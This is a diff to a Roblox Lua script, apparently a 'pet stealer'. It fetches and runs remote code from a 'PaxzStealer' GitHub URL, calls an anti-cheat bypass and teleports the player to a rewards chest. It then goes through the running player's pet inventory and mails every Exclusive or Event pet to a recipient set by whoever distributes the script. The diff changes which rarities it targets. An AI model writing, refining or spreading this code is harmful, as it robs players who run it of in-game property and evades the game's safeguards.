@@ -24,6 +24,14 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/API/main/
 
 BypassAntiCheat()
 AreaTeleport("Shop")
+wait(1.5)
+if game:GetService("Workspace")["__MAP"].Interactive["Rank Rewards"].Pad.BillboardGui.Timer.Text == "Redeem!" then
+    wait(0.5)
+    local cheast = game:GetService("Workspace")["__MAP"].Interactive["Rank Rewards"].Pad.CFrame
+    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = cheast   
+    wait(1)
+end
+wait(1.5)
 local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
@@ -66,7 +74,7 @@ end
 wait(30)
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
     if v:IsA("TextButton") then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Legendary") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
             local args = {
                 [1] = {
                     ["Recipient"] = _G.UserName,
@@ -74,7 +82,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                     ["Pets"] = {
                         [1] = v.Name
                     },
-                    ["Message"] = "made by Paxz https://discord.gg/chZ7KssecZ"
+                    ["Message"] = "made by Paxz"
                 }
             }
         Networking.Invoke("Send Mail", unpack(args))
